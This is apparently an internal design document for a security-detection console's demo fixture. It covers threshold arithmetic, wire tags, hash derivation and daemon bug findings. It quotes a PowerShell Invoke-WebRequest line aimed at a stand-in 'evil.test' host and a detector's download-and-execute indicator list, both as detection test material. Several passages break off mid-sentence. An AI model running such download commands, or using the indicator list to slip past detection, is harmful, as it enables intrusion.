## 1. This is the canonical fixture, and here is the mechanism

`fixtures/perch-demo-fixture.json` is **the** Perch fixture corpus. Not one of
several.

Wave 2 shipped five. The same case carried five channel UUIDs, six hold-id
grammars and five different `total_strength` values, each declared canonical in
its own producer's commitments block, and the consequence was that no two
screenshots in the set belonged in one deck.
`14-CLIENT-ARCHITECTURE.md` §7.4.1 clause 4 arbitrated in favour of this one and
withdrew its own competing module, on a ground that is checkable rather than
political: this is the only corpus a machine validates, and the only one whose
every opaque id regenerates from a public label (`node fixtures/derive-ids.mjs`)
instead of being transcribed by hand. A corpus you can only copy will diverge;
one you can regenerate cannot.

**The mechanism, because a declaration without one is how five fixtures happened
in the first place.** `build.mjs` emits `prototype/perch-fixture.js`, a plain
`globalThis.PERCH_FIXTURE = {…}` assignment (~38 KB). A self-contained prototype
page pastes it between two sentinels and reads `PERCH_FIXTURE.lanes`, `.queue`,
`.findings`, `.colony`, `.instrumentation` and `.holds` instead of declaring a
local cast; a re-run of `build.mjs` re-emits it. The raw wire bodies are a
*second* file, `prototype/perch-fixture-wire.js`, so a page that only needs the
cast does not pay 34 KB for card JSON it never renders — these pages are already
110–130 KB before they load either. The reason the prototypes
invented their own data was not stubbornness — it was that this fixture did not
carry a twelve-lane wall, a four-queue inbox, a colony roster or an
instrumentation strip. It does now (§4.1), so the excuse is gone.

### The one rule

**One host. One incident. Two holds. One containment lease. One rollback
receipt.**

A second host makes a screenshot look busier and breaks every peer artifact that
cites `host-ops-1`. A third hold makes the queue look real and breaks the
arithmetic in §4, which is the only part of this fixture that carries an
argument.

Two extensions were added under review pressure, and both are **quarantined
behind their own keys** rather than mixed into the cast:

| Key | What it adds | The line it may not cross |
|---|---|---|
| `background` | Deposits on six other hosts, so a twelve-lane wall is not eleven zeros and one curve (§4.1) | Nothing in `background` may ever become a card, a hold, a receipt or a decision. A surface that mints a hold out of a background deposit has misread the file. |
| `variants.contested` | A **second** Approve-scoped operator principal, deciding hold B while this console's leg 1 is in flight (§12.1) | It adds no host, no incident and no third hold. It reuses hold B, which the base scenario deliberately leaves open. A base-fixture load never sees it. |

Anything else a surface needs is a second fixture with its own document, not a
wider cast here.

### 3.2.1 The colony, and why no agent in this fixture is called `whisker-7a3f`

Four of the five wave-2 prototypes drew an agent roster of role-named ids —
`whisker-7a3f`, `calico-4d81`, `stalker-22b8`, `sphinx-2e77`. **No shipped code
path produces that shape.** Finding **F-10**.

`register_persisted_runtime_agent`
(`AMB crates/swarm-runtime-http/src/bin/swarm_detect.rs:241-271`, called eight
times from the daemon's startup block at `:772-950`) loads a
`PersistedAgentIdentity`, whose `id` is set by `from_signing_key` to
`AgentId::from_verifying_key`
(`AMB crates/swarm-runtime/src/agent_identity.rs:100-105`) — i.e.
`swarm:ed25519:{hex}` — and then *refuses to register* the agent if the built
agent's `id()` disagrees (`swarm_detect.rs:260-265`). The role and the slot are
carried **beside** the id in `ActiveAgentIdentityRecord`, not inside it. So a
colony panel renders three fields — role / slot / short key — and never invents a
name.

`AgentId::new(role, short)`, the constructor that would produce `whisker-7a3f`,
has exactly **three** non-test callers in the whole Ambush workspace, all in
`AMB crates/swarm-agents/src/tom_agent.rs` (`:702`, `:719`, `:763`), all
`unwrap_or_else` fallbacks filling `GovernanceDecision::Veto`'s
`governing_agent_id` when `state.governing_agent_id` is `None` inside the Tom
governance policy the dispatcher consults on the destructive-action path. The
only role-named ids a running daemon can emit are therefore `tom-unconfigured`
and `tom-partition`, **and both of them mean a veto**. Rendering one as a friendly
agent name would render a governance failure as an author.

The fixture's `colony` block carries all eight roles with the config key that
gates each. On the shipped `rulesets/default.yaml`, **three of eight run**:

| Role | Slot | Registered | Gate | Shipped default |
|---|---|:-:|---|---|
| whisker | primary | **yes** | — | unconditional (`swarm_detect.rs:772-776`) |
| tom | primary | **yes** | — | unconditional (`:811-815`) |
| pouncer | primary | **yes** | — | unconditional (`:843-847`) |
| stalker | primary | no | `investigation.enabled` | `false` (`rulesets/default.yaml:174`) |
| weaver | primary | no | `correlation.enabled` | `false` (`:182`) |
| kitten | primary | no | `evolution.enabled` | `false` (`:214`) |
| sphinx | primary | no | `memory.enabled` | `false` (`:315`) |
| calico | primary | no | `deception.enabled` | `false` (`:274`) |

Two consequences a surface must render rather than smooth over. **Every gated
role's absence has a named cause**, which is render law 7 applied to a colony
panel: five roles are not missing, they are switched off, and the panel says
which key. And **there is exactly one Whisker**: every one of the eight
registration calls passes the slot literal `"primary"`, and no second slot
appears anywhere in `swarm_detect.rs`. That is why every lane in §4.1 reads
`N sources / 1 agent` — one process, several detectors — which is precisely the
misreading render law 2 exists to prevent, arriving here as the shipped default
rather than as a contrived example.

The operator holds **two identities for one human**, and that is the two-legged
write made concrete: the relay knows a secp256k1 Nostr key, the daemon knows an
Ed25519 principal, and no code path turns one into the other. In the shipped
default there is exactly one operator principal, synthesised by
`OperatorAuthConfig::effective_principals` (`AMB crates/swarm-core/src/config/operator.rs:153-168`,
read by `OperatorAuthState::from_config` at `http/auth.rs:61` in every process
that loads config) with all four scopes. `OperatorPrincipalConfig` carries no
Nostr pubkey field and none exists anywhere in `swarm-core/src/config`, which is
why the mapping above is fixture-declared and why the bridge's `operator_id → npub`
map is an unsigned trust root the whole hold-delivery path depends on.

`hold_id` now has a **pinned format**, which it did not when this document was
first written: `common.schema.json`'s `$defs/HoldId`,
`^[A-Za-z0-9][A-Za-z0-9_-]{7,63}$`, `$ref`ed from the hold card, the verdict

## 4. The arithmetic — why this crosses and nothing simpler does

This is the only part of the fixture that carries an argument, so it is
reproduced from source rather than asserted. `fixtures/build.mjs` recomputes all
of it on every run.

**Three deposits, from two detectors, on one host, in one threat class.**

| # | strategy_id | telemetry event | timestamp (unix **seconds**) | confidence | deposit `agent_id` |
|---|---|---|---|---|---|
| D1 | `suspicious_process_tree` | `hunt-evt-1` | 1773738872 | 0.9 | `swarm:ed25519:18085f16…:suspicious_process_tree` |
| D2 | `suspicious_scripting` | `hunt-evt-1` | 1773738872 | 0.9 | `swarm:ed25519:18085f16…:suspicious_scripting` |
| D3 | `suspicious_process_tree` | `hunt-evt-2` | 1773738881 | 0.9 | `swarm:ed25519:18085f16…:suspicious_process_tree` |

`hunt-evt-2` produces **one** finding, not two. `suspicious_scripting` does not
fire on `powershell.exe Invoke-WebRequest https://evil.test`: `invoke-webrequest`
is in `default_download_execute_indicators` (`AMB crates/swarm-whisker/src/suspicious_scripting.rs:255-266`)
but the `download_execute` arm at `:126-133` additionally requires one of
`iex` / `invoke-expression` / `start-process` / `cmd /c` / `cmd.exe /c`, this
command line has none, `powershell` is not in `default_lolbin_processes`
(`:268-275`), and there is no encoded flag. That asymmetry is load-bearing: the
second event adds one deposit, and the crossing is three deposits, not four.

**The bars**, both from `rulesets/default.yaml` (loaded at daemon start,
`sha256`-pinned inside a signed attestation whose key is absent from the repo,
so the console is read-only against it):

- `alert_threshold: 2.0` (`:58`)
- `min_sources_for_escalation: 2` (`:57`)
- `default_half_life_secs: 3600.0` (`:55`)
- `evaporation_threshold: 0.01` (`:56`)

`PheromoneConcentration::exceeds_threshold` requires **both**
(`AMB crates/swarm-core/src/pheromone.rs:334-336`).

**The ladder.**

| State | `total_strength` | sources / agents | `≥ 2.0` | `≥ 2 sources` | escalates |
|---|---:|---|:-:|:-:|:-:|
| `suspicious_process_tree` alone on `hunt-evt-1` | 0.900000 | 1 source / 1 agent | no | no | **no** |
| both detectors on `hunt-evt-1`, one tick later | 1.799653 | 2 sources / 1 agent | **no** | yes | **no** |
| `+ suspicious_process_tree` on `hunt-evt-2` | **2.696884** | 2 sources / 1 agent | **yes** | **yes** | **yes — alert** |
| `incident_threshold` 5.0 | 2.696884 | | no | | not incident |

Decay is `confidence · 0.5^(elapsed / half_life)` with an early return of
`confidence` when `now <= timestamp` (`AMB crates/swarm-core/src/pheromone.rs:281-287`).
At the crossing tick D1 and D2 are 9 s old and read 0.898442 each; D3 is stamped
at the tick second and reads 0.900000.

**This is the sentence the demo says out loud, and it is true:** two detectors
agreeing on one workstation is not enough; a second event on the same host from
one of them is.

**Render law 2 in this fixture.** `distinct_sources` is 2 and the agent count is
1. Never render the 2 alone. The expansion to real source ids is available only
from `GET /v1/operator/pheromone/deposits` (**B4**) — `RuntimeEvent::Escalation`
(`AMB crates/swarm-runtime/src/runtime_events.rs:288-297`) carries the count and
no ids, so `fixtures/wire/card-04-escalation-execution-alert.json` sets
`source_ids: null` and the card links to the deposits route for the expansion.

### 4.1 The twelve lanes, the four queues, and the shift strip

The incident is one lane. A Watchfloor is twelve, a Watch inbox is four, and a
colony panel is eight roles — and none of those existed here, which is why five
prototypes invented five of them. They exist now, all **derived** by the same
`concentration_for` port, all measured at one instant (`lanes_observed_at_seconds`
= the demo's `now`, 09:20:00Z).

function's own order** (`AMB crates/swarm-runtime/src/escalation.rs:315-330`,

twelve regardless of value). `execution` is the story's own number, post-dismiss.
The other eleven come from `background`.

is not.** The map is read off each detector's own `evaluate`, the only place a
`DetectionFinding`'s `threat_class` is set, all of them reached through

`detector_threat_classes` so no peer has to re-derive it, and the assertion runs
on every build, so a background deposit cannot quietly claim a detector produces
a class it cannot.

**`discovery` is structurally empty on every shipped build.** Finding **F-11**.
It is one of the twelve standard lanes and **no detector emits it**: thirteen
occurrences of `ThreatClass::Discovery` exist under `crates/`; twelve are
name-formatting match arms or the lane enumeration itself, and the thirteenth
(`AMB crates/swarm-runtime/src/calico_agent.rs:1019`) is inside a `#[cfg(test)]`
module that begins at `:907`. So the lane's empty state is a **coverage gap with
a cause**, not a quiet hour — exactly the distinction render law 7 exists for,
and the strongest concrete case in the fixture for `/gaps` being a route rather
than a footnote. `lanes_with_no_detector` carries it as data.

**Every lane reads `N sources / 1 agent`.** Not a fixture limitation: §3.2.1's
single Whisker slot. A wall drawn honestly from this file shows one agent
everywhere and a source count that is per-detector, which is the reading error
render law 2 exists to prevent, arriving as the shipped topology.

**`queue` — the four inbox categories**, using `04` §2.1's words (Holds / Named

**`instrumentation` — the C9 strip**, and two of its five numbers are the literal

### 6.0 What that line used to say, and why the change matters

The previous revision printed **`0 unexplained failure(s); 13 recorded
departure(s)`** and exited 0. The red team read that correctly: those were not
annotations. They were the **eleven marker-card files failing schema validation**
— one of them, the escalation card, on two independent grounds — with the
failures suppressed by six `match` predicates in the validator's own
configuration — keyed on ajv `instancePath` + `keyword`, each pointing at a
proposed amendment. A validator that can be taught to pass is the worst possible
property for the one artifact every other artifact is built on, and the objection
stands regardless of whether each individual departure was later ratified.

Three things changed, and only one of them was a wording fix.

(The count in the review was twelve; re-derived here it is eleven files and
twelve distinct failures, because `card-04` carried both the `role` failure and
the `distinct_sources_counts` `const`. The difference does not soften anything.)

1. **Two of the three departures were ratified in the peer schemas.**
   `FactIssuer.role` is now nullable-and-required (`common.schema.json`
   `$defs/FactIssuer`, with the mechanism written into the field's own
   description); `SourceCountMechanism` is now
   `const: "strategy_scoped_agent_id"`. Amendments **W-A1** and **W-A2** are
   **landed**, not proposed. This fixture already emitted both values, so it
   went from twelve failures to zero without a single data change.
2. **The third departure was this fixture's defect, and it was fixed here.** The
   two `kind:46010` notices carried `t`, `l` and `k` tags that
   `13-WIRE-SCHEMAS.md`'s tag commitment forbids and that
   `event-46010-hold-notice.schema.json` now enforces through
   `items.prefixItems[0].enum`. They are gone (§6.1).
3. **The allowlist is deleted.** Not emptied — removed, along with the concept.
   If an amendment is ever genuinely pending again, the correct shape is a
   second, *named* pass over an explicit overlay, never a predicate that turns a
   red line green in the default run.

`validate.mjs` gained three properties while it was open, each closing a way a
bad file could pass:

- **It keys each file to its schema by content** (`fact.schema` / `kind`), not by
  filename prefix. The old version keyed on a `card-` prefix, so the four
  `variant-contested-*` files would have been reported `SKIP` — a verdict that is
  neither ok nor FAIL, which is exactly how an unvalidated fixture hides inside a
  green run. A body it cannot place is now a failure.
- **It recomputes every `envelope_hash` from the file's own bytes** (§9), and
  refuses any file carrying a `signature` field.
- **It walks each per-issuer envelope chain**, asserting `seq` is `1..n` and each
  `prev_envelope_hash` links to the previous hash from the *same* issuer.

Each card body on the relay is:

```
<!-- ambush:hold:v1 -->

```json
{ …the envelope from fixtures/wire/card-05-….json… }
```
```

The marker is the **whole first line**, then a fenced `json` block. Buzz's own
precedent is looser — `parseWaveMessageContent`'s predicate is
`content.trimStart().startsWith(WAVE_MESSAGE_MARKER)` over arbitrary content
(`BUZZ desktop/src/features/messages/lib/waveMessage.ts:12-19`, called from

renderer.

`fixtures/mock-bridge/perchFixture.ts` exports `markerCardBody(kind, envelope)`,
which builds exactly this shape, so no fixture can accidentally satisfy a loose
sniff the product later tightens.

### 6.1 Tags carried — and the two different rules

The `kind:9` marker cards and the `kind:46010` notices do **not** share a tag
rule, and an earlier draft of this fixture conflated them. Stating both, because
the confusion cost three files.

**`kind:9` marker cards** carry the appendix §3 budget: `h` mandatory, `e`/`p`
for NIP-10 and mentions, `t` = threat-class slug, `l` = `Severity` in
SCREAMING_SNAKE, `k` = card-kind slug. `t`, `l` and `k` are **post-filters over a
fetched page, never indexed selection**, and a filter naming one disqualifies the
fast COUNT path — which is the appendix's own ruling and the reason they are
cheap to carry on a card the client already holds.

**`kind:46010` notices carry exactly four tag names: `h`, `p`, `hold`, `card`.**
No `e`, no `t`, no `l`, no `k`. This is `13-WIRE-SCHEMAS.md`'s KIND 46010 TAGS
commitment, and `schemas/event-46010-hold-notice.schema.json` now enforces it
through `items.prefixItems[0].enum` rather than asserting it in prose. **This
fixture was wrong and is fixed**: both notices previously carried `t`, `l` and
`k`. Three reasons the four-name set is right and the seven-name set was not:

- All three extras are **single-letter**, so the relay writes each into the tag
  index on insert, widening the closed index budget (`h`/`p`/`e`/`d`) the
  appendix exists to bound.
- They buy nothing back. `filter_fully_pushable`
  (`BUZZ crates/buzz-relay/src/handlers/req.rs:851-895`, the function that
  decides whether a REQ filter can be pushed into SQL) routes `#t`, `#l` and
  `#k` to its default arm at `:885-890` — not pushed — so a filter naming one
  post-filters a diluted page *and* loses the fast COUNT path.
- Nothing selects 46010 by tag anyway. Both shipped needs-action queries are
  kinds + `#p` only (`BUZZ desktop/src-tauri/src/commands/messages.rs:97-101`
  and `BUZZ mobile/lib/features/activity/activity_provider.dart:476`).

Index cost with no query benefit is the definition of a tag that should not
ship. `hold` and `card` are multi-letter, are never used in a filter, and are
read only off an event the client already holds.

**And no `e` tag, on purpose.** Once the fork makes 46010 channel-scoped,
`ingest_event` gates NIP-10 thread-metadata resolution on the same predicate
(`BUZZ crates/buzz-relay/src/handlers/ingest.rs:2987-2997`, in the relay process
on the shared WebSocket+HTTP ingest task), so an `e`-tagged hold becomes a reply,
mutates `reply_count` and `descendant_count` on its root inside the insert
transaction, and triggers a relay-signed `kind:39005` thread-summary fan-out at
`:3219-3226`. The linkage is carried by the `card` tag instead.

**One `p` per Approve-scoped principal.** The base fixture's notices carry one,
because `OperatorAuthConfig::effective_principals` synthesises exactly one on the
shipped default. `wire/variant-contested-event-46010-hold-b-two-principals.json`
carries two, and that file is the whole reason §12.1 exists: two `p` tags is the
configuration in which two consoles can legitimately hold the same open hold.

### 6.2 The frames

Ten ephemeral frames, all global (no `h`), aggregates and opaque ids only. The
26001 frames each carry `coalesced_from: 10` and an `observed_at_seconds`,
because the ten monitor ticks inside one second are byte-identical — `now` is
`unix_timestamp_secs()` (`AMB crates/swarm-runtime/src/escalation.rs:407-410`,
called by `ConcentrationMonitor::evaluate_all` on every 100 ms tick in
`swarm_detect --serve`). That gives the bridge a free dedupe key and makes
"coalesce 10 Hz → 1 Hz in the bridge" implementable rather than aspirational.

The 26005 tamper frame is present and **negative** (`fail_closed: false`,
`unexpected_library_count: 0`). A demo with no negative frame teaches an operator
that the frame only appears when something is wrong, which is the opposite of
what a liveness signal is for.

2. **Navigate, wait for the subscription, then emit.** Without an open live
   subscription the message is dropped with no error, which reads as a product
   bug.
3. **Feed rows last**, so the queue row's `created_at` is newer than the case
   timeline it points at and the auto-selection lands where the demo expects.

**The one non-determinism, named.** `handleCreateChannel` mints
`crypto.randomUUID()` (`e2eBridge.ts:6993` and `:7020`) and accepts no id
override, so the mock's case-channel UUID is not the fixture's canonical one.
`seedPerchDemo` returns the ids the mock assigned; a spec that must assert on a
URL passes `{ deterministicIds: true }`, which patches `crypto.randomUUID` inside
the page across exactly the two create calls and restores it in a `finally`.
That is test-local and changes no product code. **Do not** add an `id`
passthrough to `handleCreateChannel` for this — the file is off limits, and the
patch is three lines in a helper the product never loads.

### 8.2 What the seed deliberately cannot do

It does not answer `POST /decide` or any other daemon **write**. Those are HTTP
to `127.0.0.1:9090`, and `perchDaemonRoutes(page, bodies, options)` — a separate
export in the same file — is how a spec gets them, serving `fixtures/http/*.json`
through `page.route()`. It takes an `outcome` of `"granted"` or `"contested"`,
which is what lets one helper drive both the ordinary grant and the 409 in
§12.1, and it fulfils the 409 with **status 409 and a JSON body**, because a
conflict is a normal outcome carrying a rule name, not a transport error
(`INV-28`).

The separation is not tidiness. Keeping the halves apart in the harness is the
same process boundary the product is built on: this module can seed a queue, and
nothing in it can authorize anything. A spec that wants a decision has to say so
in its own line, in its own call.

**The build trap, restated because it costs an hour every time.** Build with
`pnpm build:e2e`. A plain `pnpm run build` strips the mock bridge, so
`window.__TAURI_INTERNALS__` is never defined and every spec fails with
`Cannot read properties of undefined (reading 'invoke')` while the app renders
"Community connection failed" — indistinguishable from a product bug. And kill
port 4173 first: `reuseExistingServer: true` serves the previous build.

## 9. Nothing here is signed — and the hashes are real anyway

Every 64-hex value in this fixture is shaped like a secp256k1 x-only key or an
Ed25519 public key and is **neither**. Every 128-hex value is shaped like a
signature and is **not one**. All of them are
`sha256("perch-demo-fixture/v1/" + label)` and any reader can regenerate them
with `node fixtures/derive-ids.mjs`.

**The `envelope_hash` values are the one exception, and they are genuine.** They
used to be placeholders — `sha256("…/envelope-hash/" + a label)` — which made the
demo's "check against the daemon" affordance a picture of a diff rather than a
diff. They are now computed the way the daemon computes them: sha256 over the
RFC 8785 canonical form of the envelope with `envelope_hash` and `signature`
absent, `0x`-prefixed. That is `compute_envelope_hash_hex`
(`AMB crates/swarm-spine/src/envelope.rs:47-51`) over `envelope_signing_bytes`
(`:38-45`) over `canonicalize_json`
(`AMB crates/swarm-crypto/src/lib.rs:37` → `canonical.rs::canonicalize`), and
`build.mjs` carries a JCS port of that function with the three clauses that
matter spelled out: UTF-16 code-unit key order (`canonical.rs:46-61`), the
integer-vs-ES6-shortest number split (`:64-106`), and the eight named string
escapes plus `\u00xx` for control characters (`:205-223`). The port **refuses**
any value outside the band where JS and Rust provably agree — a non-finite
number, a magnitude needing the exponential form, or a `U+007F`–`U+009F`
character, where Rust's `char::is_control` escapes and `JSON.stringify` does not
— rather than silently diverging.

`fixtures/validate.mjs` carries the same port, self-tested against RFC 8785's own
key-ordering and number vectors, and **recomputes all fourteen hashes from the
committed files' own bytes** on every run. So a reader can prove the hashes
rather than take them.

`seq` and `prev_envelope_hash` are per-`(issuer, stream)`, not global, per
`13-WIRE-SCHEMAS.md`'s SEQ commitment. There are three chains here — the bridge's
evidence stream (10 links), the operator's verdict stream (3), and the second
operator's (1) — and `validate.mjs` walks each. This matters because a consumer
that merges issuers into one sequence reports a phantom gap at **every verdict
card**, which is a false "the console lost a card" alarm on the one event type
where a false alarm is least acceptable.

**None of that raises the tier.** Cards carry `envelope_hash` and, deliberately,
no `signature` key at all — `build_signed_envelope` adds that key only when it
signs (`envelope.rs:97-99`), so its *absence* is the wire's own statement that
nothing signed this. A hash computed with no key proves the bytes have not
changed since somebody wrote them; it proves nothing about who. Every card in
this fixture renders **tier 0**, and the sequence-continuity result renders as
its own separate, explicitly non-cryptographic row. `validate.mjs` fails any file
that acquires a `signature` field, so the fixture cannot drift into implying
otherwise.

This is the same honesty the workspace already owes about its one live envelope
signature: `build_signed_envelope`'s single non-test caller derives its keypair
as `Keypair::from_seed(sha256("approval-ledger-envelope:{ledger_id}"))`
(`AMB crates/swarm-runtime/src/approval.rs:1807-1809`, in the approval-ledger
vote path), signs, verifies its own signature, then discards it and keeps only
`envelope_hash` at `:1836-1840`. That is a chaining checksum, not provenance,
and no surface built on this fixture may say otherwise.

The one exception in the workspace is `verify_release_attestation`
(`AMB crates/swarm-runtime/src/containment.rs:235-269`, called at
`http/containment.rs:219-222` in the daemon's release handler), which checks
both the signature and the subject binding on a `RollbackReceipt`'s
`governance_attestation`. This fixture's rollback receipt sets
`governance_attestation` **absent**, so the badge reads `UNATTESTED` — the
honest state, and the one an operator will actually see on a shipped default.

### F-1 — The live HTTP ingest lane writes every deposit twice (new)

`process_runtime_event` (`AMB crates/swarm-ingest-runtime/src/ingest/mod.rs:1048-1147`,
serving `POST /v1/ingest/events` in `swarm_detect --serve`) calls
`process_event_with_finding_observer` with `agent_id: &signing_agent_id` at
`:1083` — which produces deposits with ids
`swarm:ed25519:{X}:{strategy_id}` — **and then**, on success, forwards a clone
of the same `TelemetryEvent` to `state.telemetry_tx` at `:1101-1103`. That
channel is drained by the registered `WhiskerAgent`, whose `tick` builds
`scoped_agent_id = AgentId(format!("{}:{}", derived_identity.0, self.id.0))`
(`AMB crates/swarm-agents/src/whisker_agent.rs:148-149`) and calls
`detect_and_deposit_with_role` again. Because
`register_persisted_runtime_agent` (`swarm_detect.rs:241-271`) loads the Whisker
identity through `PersistedAgentIdentity::from_signing_key`, which sets
`id = AgentId::from_verifying_key` (`AMB crates/swarm-runtime/src/agent_identity.rs:100-105`),
that second id is `swarm:ed25519:{X}:swarm:ed25519:{X}:{strategy_id}` — a
**different string**. The substrate therefore receives two deposits per finding
with two distinct source ids.

Consequence: on the live ingest lane, `total_strength` is doubled and
`distinct_sources` is doubled. The threshold arithmetic in §4 would read 5.39
with 4 sources, not 2.70 with 2.

**The fixture runs the replay lane**, `process_demo_replay_step`
(`AMB crates/swarm-ingest-runtime/src/ingest/mod.rs:1166-1280`), which has no
`telemetry_tx` forward and therefore writes one deposit per finding. That is why
`fixtures/scenario/hellcat-office-demo.yaml` is a replay scenario and why
`run-demo.sh up` drives `swarmctl first-run --scenario`.

This is a finding about the daemon, not about Perch, and it is filed here
because any Perch surface that renders a concentration will show it. It is not
on the eleven-item backend bill and nobody has recorded it.

### F-2 — `FactIssuer.role` is unfillable on the shipped path (RESOLVED — W-A1 landed)

`build/schemas/common.schema.json` declares `FactIssuer` with
`required: [swarm_agent_id, role]` and `role` as the eight-variant `AgentRole`
enum with no null. But the only agent id on the shipped daemon detect path is
`swarm:ed25519:{hex}`, and `infer_agent_role`
(`AMB crates/swarm-runtime/src/detection/pipeline.rs:583-604`, called by
`detect_and_deposit` at `:52` to label the deposit) matches on a `{role}-`
prefix and returns `None` for it. `resolve_deposits` then writes
`agent_role: None` onto every deposit.

Further, `RuntimeEvent::Finding` (`AMB crates/swarm-runtime/src/runtime_events.rs:224-228`)
carries **only** `emitted_at_ms`, `host_id` and the envelope — no agent id at
all — because `publish_runtime_findings`
(`AMB crates/swarm-ingest-runtime/src/ingest/providence_handlers.rs:773-786`)
builds it from the finding alone. The bridge can supply the daemon's own ingest
identity because it runs in-process, but it cannot supply a role.

**Departure:** every card in `fixtures/wire/` sets `"role": null`. It is the
only honest value. Emitting `"whisker"` unconditionally would be false — nothing
on this path is a `WhiskerAgent` instance.

**W-A1 has landed.** `common.schema.json`'s `FactIssuer.role` is now
`oneOf: [AgentRole, null]` and still `required`, so an absence is an explicit
null rather than a missing key and the distinction between "no role" and "the
producer forgot" survives. The field's description carries the mechanism, and it
carries one thing this document had not: there are **two** production paths and
they disagree. A `WhiskerAgent::tick` deposit passes
`Some(AgentRole::Whisker)` explicitly into `detect_and_deposit_with_role`
(`AMB crates/swarm-agents/src/whisker_agent.rs:150-156`), so a finding produced on
*that* path does carry a role; `infer_agent_role` returns `None` for every
`swarm:ed25519:` id, which is the only identity on the HTTP-ingest and replay
lanes this fixture uses. Both are real. `null` here means "the producing path
could not name a role", and a console renders the absence rather than
substituting one.

The verdict card is the one exception in the registry and gets its own
definition: `$defs/OperatorFactIssuer`, where `role` is `const: null`. That is
not tidiness — `AgentRole::Tom` is *governance*, the veto actor, and stamping it
on an operator's own decision would conflate the human's refuse with governance's
veto, which appendix §7 forbids outright.

### F-3 — The shipped scenario's timestamps freeze the decay curve (departure)

`scenarios/office-dropper-correlation.yaml` stamps
`timestamp: 1700000000000` — milliseconds. `resolve_deposits` copies
`TelemetryEvent.timestamp` straight into `PheromoneDeposit.timestamp`
(`AMB crates/swarm-runtime/src/detection/pipeline.rs:571`) and
`strength_at` compares it against a `now` the monitor produces with
`unix_timestamp_secs()`. With a millisecond timestamp, `now <= self.timestamp`
holds forever, `strength_at` takes the early return at
`AMB crates/swarm-core/src/pheromone.rs:282-284`, and every deposit sits at full
confidence for the life of the process: flat curve, unreachable evaporation
threshold.

That is invisible to a pass/fail replay assertion and extremely visible on a
chart. **Departure:** `fixtures/scenario/hellcat-office-demo.yaml` stamps
seconds. Nothing else changes.

### F-4 — A Confirm permanently pins a threat class 1.0 above baseline (new)

`signed_providence_feedback_deposit`
(`AMB crates/swarm-ingest-runtime/src/ingest/providence_handlers.rs:497-560`,
called by `providence_feedback_handler` in `swarm_detect --serve` and by
`soar_verdict_handler`) writes a marker deposit with
`timestamp: recorded_at_ms` at `:534` — **milliseconds** — while every detector
deposit carries event-time seconds. Two consequences:

- `is_suppressed_by_feedback`'s `*timestamp >= deposit.timestamp` comparison
  (`AMB crates/swarm-pheromone/src/substrate.rs:1376-1379`) is therefore
  *always* true against any seconds-stamped deposit. The intended "at or before
  the marker" semantics never bind.
- A **Confirm** marker is written with `confidence: 1.0` (`:302-311`) and is not
  a suppression, so `concentration_for` sums it. Its `strength_at(now_seconds)`
  takes the `now <= timestamp` early return and returns 1.0 forever. One Confirm
  adds a permanent +1.0 to `total_strength` **and** one new distinct source id —
  the daemon's own unscoped `swarm:ed25519:{X}` — that no detector uses.

A **Dismiss** marker is written with `confidence: 0.0` and is skipped by

This fixture uses **Dismiss** for its feedback beat, so the arithmetic in §4 is
not perturbed. A producer building a Confirm beat must render the +1.0 and the
new source, or the console's number and `swarmctl`'s will disagree. This is not
on the backend bill.

### F-5 — `distinct_sources` counts strategy-scoped ids, not agent instances (correction)

Two wave-2 ground notes and `build/schemas/common.schema.json`'s
`PheromoneConcentration` x-note say `distinct_sources` counts agent instance ids
and that "one Whisker running four detectors registers as ONE source and FAILS
`min_sources_for_escalation: 2`". **That is backwards**, and this fixture's whole
argument depends on which way it runs.

`concentration_for` does `sources.insert(deposit.agent_id.0.clone())`
(`AMB crates/swarm-pheromone/src/substrate.rs:1295`). The deposit's `agent_id`
is not the agent instance id: `resolve_deposits`
(`AMB crates/swarm-runtime/src/detection/pipeline.rs:543-581`, the only
production deposit-construction site, called from `detect_and_deposit_with_role`
at `:80` on the daemon's detect path and from `persist_findings_as_deposits` at
`:619`) sets `agent_id: strategy_scoped_agent_id(agent_id, &finding.strategy_id)`
at **`:573`**, and `strategy_scoped_agent_id` is
`AgentId(format!("{}:{strategy_id}", base.0))`
(`AMB crates/swarm-whisker/src/stream.rs:19-21`).

So one agent running four detectors yields **four** distinct source ids and
**passes** `min_sources_for_escalation: 2`. The ground note reached its
conclusion from `whisker_agent.rs:148-149` alone and missed `resolve_deposits`,
which runs one layer below it on the same call.

**Render law 2 survives unchanged and its expansion is restored**: `N sources /
M agents` is meaningful again, and in this fixture it is **2 sources / 1 agent**.
The corollary the correct mechanism creates is different and sharper: a source
count can exceed the agent count, so a bare "2 sources" reads as two independent
observers when it is one process running two rules. That is exactly what render
law 2 exists to prevent.

**W-A2 has landed**, and it is worth recording *how*, because it is the clearest
case in the wave of a correct majority reading nearly losing to file ownership.
Six producers read `pipeline.rs:573` and concluded strategy-scoped; the two who
owned the schemas read `whisker_agent.rs:148-149`, stopped there, and compiled
the opposite into a `const`, a `z.literal` and a golden vector. Prose does not
outvote a decoder literal. What settled it was neither vote nor seniority but
the workspace's own assertion:
`query_counts_strategy_scoped_agent_ids_as_distinct_sources`
(`AMB crates/swarm-pheromone/src/substrate.rs:2105`) is a test in the substrate
that pins the counting unit, and it agrees with the six.

`common.schema.json` now carries `$defs/SourceCountMechanism` as
`const: "strategy_scoped_agent_id"` with the full call chain in its description,
and — usefully for anyone who re-derives this a third time — a warning that
`PheromoneConcentration`'s own doc comments at
`AMB crates/swarm-core/src/pheromone.rs:323` and `:325` say "distinct agents" and
are **wrong about the unit**. That doc comment is how this was misread twice.

The escalation card also gained a sibling the wire needed and nobody had:
`source_ids_absent_reason`, required, exactly one of it and `source_ids` non-null.
`RuntimeEvent::Escalation` carries a count and no ids
(`AMB crates/swarm-runtime/src/runtime_events.rs:288-296`) and the bridge holds no
substrate handle, so only **B4** can ever serve them. Without the field, the
agent half of render law 2 has no representable absence, and a component either
fabricates a number or spins. This fixture's card carries
`"not_carried_by_runtime_event"`.

### F-9 — The verbatim policy reason contains a banned word (RESOLVED — C-A2 landed)

Render law 1 requires the `WHY WE ARE ASKING` slot to carry "the named policy
rule + its reason **verbatim**". The only reason a production hold can carry is
`"authorized but held for human approval"` — a single constant
`StaticApprovalGate::evaluate` returns for all twelve destructive kinds
(`AMB crates/swarm-policy/src/static_gate.rs:294-299`, reached as
`ConfigurableApprovalGate::evaluate`'s fallthrough at `configurable_gate.rs:183`

Appendix §7 bans `Approve`/`Approved` as a control label, and the ban list's
`approve` row was `appro(ve|ved|val)`, case-insensitive, with **no exemption**.
The two requirements collided on the one string every hold card must print.

They are both right. The ban is about a *control label*; the reason is a *quoted
wire value*. **C-A2 has landed**: the `approve` row's exempt now reads
`static\.human_gate|policy_decision\.reason|rationale\.reason|hold\.reason|authorized but held for human approval`,
so the daemon's own reason quoted beside its rule name passes and a button label
